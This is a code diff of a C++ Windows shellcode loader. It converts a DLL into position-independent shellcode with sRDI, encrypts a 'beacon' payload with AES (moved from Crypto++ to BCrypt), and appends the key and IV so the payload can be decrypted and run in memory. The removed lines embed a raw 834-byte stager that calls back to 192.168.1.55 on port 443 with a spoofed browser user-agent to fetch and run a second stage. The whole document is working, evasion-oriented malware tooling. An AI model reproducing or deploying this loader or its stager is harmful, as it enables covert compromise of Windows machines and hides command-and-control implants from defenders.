@@ -22,21 +22,16 @@
 // ReSharper disable CppClangTidyClangDiagnosticCastQual
 // ReSharper disable CppClangTidyClangDiagnosticCastAlign
 #include <Windows.h>
-#include <string>
-
-#include "modes.h"
-#include "aes.h"
-#include "files.h"
-#include "filters.h"
-#include "osrng.h"
+#include <bcrypt.h>
+#include <functional>
 
 #include "Dll.h"
+#include "payload.h"
 
-#ifdef _DEBUG
-#pragma comment(lib, "cryptlib")
-#else
-#pragma comment(lib, "cryptlibRelease")
-#endif
+#pragma comment(lib, "Bcrypt.lib")
+
+#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
+#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
 
 #define DEREF_64( name )*(DWORD64 *)(name)
 #define DEREF_32( name )*(DWORD *)(name)
@@ -363,65 +358,195 @@ typedef UINT_PTR(WINAPI* RDI)();
 typedef void(WINAPI* Function)();
 typedef BOOL(__cdecl* EXPORTEDFUNCTION)(LPVOID, DWORD);
 
-int main(int argc, char* argv[], char* envp[])
+void main(int argc, char* argv[], char* envp[])
 {
 	LPSTR finalShellcode = nullptr;
 	DWORD finalSize;
-	std::vector<BYTE> beacon;
 	int inSize;
 	DWORD dwOldProtect1 = 0;
 	SYSTEM_INFO sysInfo;
-	
-	BYTE key[CryptoPP::AES::DEFAULT_KEYLENGTH] = {};
-	BYTE iv[CryptoPP::AES::BLOCKSIZE] = {};
+	BCRYPT_ALG_HANDLE       hAesAlg = NULL;
+	BCRYPT_KEY_HANDLE       hKey = NULL;
+	NTSTATUS                status = STATUS_UNSUCCESSFUL;
+	DWORD                   cbCipherText = 0,
+		cbRawData = 0,
+		cbData = 0,
+		cbKeyObject = 0,
+		cbBlockLen = 0;
+	PBYTE                   pbCipherText = NULL,
+		pbRawData = NULL,
+		pbKeyObject = NULL,
+		pbIV = NULL;
+	BYTE                    creds[32] = {};
 
-	CryptoPP::AutoSeededRandomPool rnd;
-	rnd.GenerateBlock(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
-	rnd.GenerateBlock(iv, CryptoPP::AES::BLOCKSIZE);
-
-	CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption cipher{};
-	cipher.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
-
-	/* length: 834 bytes */
-	BYTE buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\xe8\x00\x00\x00\x00\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\xa4\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\x50\xe9\x8c\x00\x00\x00\x5b\x31\xd2\x52\x68\x00\x32\xc0\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x5f\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x75\x07\x58\x50\xe9\x7b\xff\xff\xff\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x6f\xff\xff\xff\x2f\x49\x37\x79\x63\x00\x6a\xf4\x41\xda\xa1\xbb\x24\xde\x61\x55\xa6\x5e\x2a\xc0\xac\xf3\xc7\xc4\x78\x77\x6a\xcd\xb1\x24\xf6\x7e\xbf\x4d\xb1\x52\x2c\x45\xd4\x70\x04\x49\x82\x4d\x62\x94\x82\x62\x58\x69\x92\x39\xe5\xc9\xd2\xd6\xe1\x8a\x2c\x9c\xca\x5e\x9d\xe5\x5a\xee\xb3\x49\xb5\x0f\xfe\xf1\xfa\x8c\xec\xdd\x5c\xfe\x57\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x53\x56\x53\x45\x29\x0d\x0a\x00\x69\x55\x7d\x3b\xe9\xd1\x30\x4e\x3c\xe0\x37\x2c\x9a\x1e\xed\xd9\xe2\xf8\xe8\x08\x9c\xbe\xcd\xe9\x4e\xa4\x51\x32\x23\xb3\x33\x02\x11\x1f\x0f\x63\xfd\xca\x04\x4b\x63\x52\x1b\x72\xe2\xc4\x46\x7e\x58\x79\xfc\x3c\xd0\x81\x34\x9b\x7c\x9a\x71\x4c\x98\xb9\xf0\x23\xc4\x04\xd4\x19\x56\x81\xcd\x23\x67\xc4\x40\xde\xdf\xd9\x3e\x5c\xcd\xb7\x13\x72\xb0\x09\x06\xfb\x66\xe7\xe5\x03\x39\x4a\x8e\xc9\x06\x6a\xd9\xb0\xb4\x98\xc7\x67\x45\x4d\x1b\x06\xee\x04\x97\x40\xc7\x53\x22\xc5\x34\xee\x0f\x78\x3a\x7c\x23\xbb\xa4\x8f\x2b\x44\x2c\xcb\x14\xaa\x65\xc0\xf6\xb7\xa4\x28\x4d\x33\xa9\xf7\x02\x53\xa4\x1b\xaf\x04\xa9\xb2\xe1\x2c\x5f\xc1\x48\x69\x73\x1d\xac\x63\x33\x0c\x3a\xde\x22\xbf\x50\x30\x68\x21\x0a\xf6\x2a\xf5\x90\x9b\xe3\xea\xea\x9c\x93\x47\x7f\x37\xdc\xcf\x07\x5f\x6c\xc0\xe6\xec\x44\xeb\x7b\xb6\x41\xa7\xb2\xb5\x42\x21\xca\xc7\xf1\xf4\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x89\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x35\x35\x00\x12\x34\x56\x78";
-	inSize = sizeof(buf);
-
-	//std::ifstream in{ argv[1], std::ios::binary | std::ios::ate };
-	//inSize = in.tellg();
-	
-	beacon.resize(inSize + CryptoPP::AES::BLOCKSIZE);
-	CryptoPP::ArraySink rs(&beacon[0], beacon.size());
-
-	CryptoPP::ArraySource( buf, /*pumpAll=*/true,
-	//CryptoPP::FileSource{ in, /*pumpAll=*/true,
-					 new CryptoPP::StreamTransformationFilter(
-						 cipher, new CryptoPP::Redirector(rs)) );
-
-	beacon.resize(rs.TotalPutLength() + CryptoPP::AES::DEFAULT_KEYLENGTH + CryptoPP::AES::BLOCKSIZE);
-
-	const DWORD extra = CryptoPP::AES::BLOCKSIZE + CryptoPP::AES::DEFAULT_KEYLENGTH;
-	
-	BYTE payload[extra] = {0};
-	std::copy_n(key, CryptoPP::AES::DEFAULT_KEYLENGTH, payload);
-	std::copy_n(iv, CryptoPP::AES::BLOCKSIZE, payload + CryptoPP::AES::DEFAULT_KEYLENGTH);
-
-	for (BYTE& i : payload)
+	// Open an algorithm handle.
+	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
+		&hAesAlg,
+		BCRYPT_AES_ALGORITHM,
+		NULL,
+		0)))
 	{
-		beacon.push_back(i);
+		wprintf(L"**** Error 0x%x returned by BCryptOpenAlgorithmProvider\n", status);
+		goto Cleanup;
 	}
+
+	// Calculate the size of the buffer to hold the KeyObject.
+	if (!NT_SUCCESS(status = BCryptGetProperty(
+		hAesAlg,
+		BCRYPT_OBJECT_LENGTH,
+		(PBYTE)&cbKeyObject,
+		sizeof(DWORD),
+		&cbData,
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
+		goto Cleanup;
+	}
+
+	// Allocate the key object on the heap.
+	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+	if (NULL == pbKeyObject)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	// Calculate the block length for the IV.
+	if (!NT_SUCCESS(status = BCryptGetProperty(
+		hAesAlg,
+		BCRYPT_BLOCK_LENGTH,
+		(PBYTE)&cbBlockLen,
+		sizeof(DWORD),
+		&cbData,
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
+		goto Cleanup;
+	}
+
+	// Determine whether the cbBlockLen is not longer than the IV length.
+	if (cbBlockLen > sizeof(rgbIV))
+	{
+		wprintf(L"**** block length is longer than the provided IV length\n");
+		goto Cleanup;
+	}
+
+	// Allocate a buffer for the IV. The buffer is consumed during the 
+	// encrypt/decrypt process.
+	pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
+	if (NULL == pbIV)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	memcpy(pbIV, rgbIV, cbBlockLen);
+
+	if (!NT_SUCCESS(status = BCryptSetProperty(
+		hAesAlg,
+		BCRYPT_CHAINING_MODE,
+		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
+		sizeof(BCRYPT_CHAIN_MODE_CBC),
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptSetProperty\n", status);
+		goto Cleanup;
+	}
+
+	// Generate the key from supplied input key bytes.
+	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
+		hAesAlg,
+		&hKey,
+		pbKeyObject,
+		cbKeyObject,
+		(PBYTE)rgbAES128Key,
+		sizeof(rgbAES128Key),
+		0)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptGenerateSymmetricKey\n", status);
+		goto Cleanup;
+	}
+
+	cbRawData = sizeof(rgbRawData);
+	pbRawData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawData);
+	if (NULL == pbRawData)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	memcpy(pbRawData, rgbRawData, sizeof(rgbRawData));
+
+	//
+	// Get the output buffer size.
+	//
+	if (!NT_SUCCESS(status = BCryptEncrypt(
+		hKey,
+		pbRawData,
+		cbRawData,
+		NULL,
+		pbIV,
+		cbBlockLen,
+		NULL,
+		0,
+		&cbCipherText,
+		BCRYPT_BLOCK_PADDING)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
+		goto Cleanup;
+	}
+
+	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText + 32);
+	if (NULL == pbCipherText)
+	{
+		wprintf(L"**** memory allocation failed\n");
+		goto Cleanup;
+	}
+
+	// Use the key to encrypt the plaintext buffer.
+	// For block sized messages, block padding will add an extra block.
+	if (!NT_SUCCESS(status = BCryptEncrypt(
+		hKey,
+		pbRawData,
+		cbRawData,
+		NULL,
+		pbIV,
+		cbBlockLen,
+		pbCipherText,
+		cbCipherText,
+		&cbData,
+		BCRYPT_BLOCK_PADDING)))
+	{
+		wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
+		goto Cleanup;
+	}
+
+	std::copy_n(rgbAES128Key, 16, creds);
+	std::copy_n(rgbIV, 16, creds + 16);
+
+	memcpy(&pbCipherText[cbCipherText], creds, sizeof(creds));
 
 	if (rawData[0] == 'M' && rawData[1] == 'Z') {
 		printf("[+] File is a DLL, attempting to convert\n");
 
-		if (!ConvertToShellcode(rawData, sizeof(rawData), HashFunctionName((LPSTR)"Run"), beacon.data(), beacon.size(), SRDI_CLEARHEADER, finalShellcode, finalSize)) {
+		if (!ConvertToShellcode(
+			rawData, 
+			sizeof(rawData), 
+			HashFunctionName((LPSTR)"Run"), 
+			pbCipherText, 
+			cbCipherText + 32, 
+			SRDI_CLEARHEADER, 
+			finalShellcode, 
+			finalSize
+		)) {
 			printf("[!] Failed to convert DLL\n");
-			return 0;
+			goto Cleanup;
 		}
 
 		printf("[+] Successfully Converted\n");
 	}
 	else {
-		return 1;
+		goto Cleanup;
 	}
 
 	GetNativeSystemInfo(&sysInfo);
@@ -443,5 +568,35 @@ int main(int argc, char* argv[], char* envp[])
 		}
 	}
 
-	return 0;
+Cleanup:
+
+	if (hAesAlg)
+	{
+		BCryptCloseAlgorithmProvider(hAesAlg, 0);
+	}
+
+	if (hKey)
+	{
+		BCryptDestroyKey(hKey);
+	}
+
+	if (pbCipherText)
+	{
+		HeapFree(GetProcessHeap(), 0, pbCipherText);
+	}
+
+	if (pbRawData)
+	{
+		HeapFree(GetProcessHeap(), 0, pbRawData);
+	}
+
+	if (pbKeyObject)
+	{
+		HeapFree(GetProcessHeap(), 0, pbKeyObject);
+	}
+
+	if (pbIV)
+	{
+		HeapFree(GetProcessHeap(), 0, pbIV);
+	}
 }
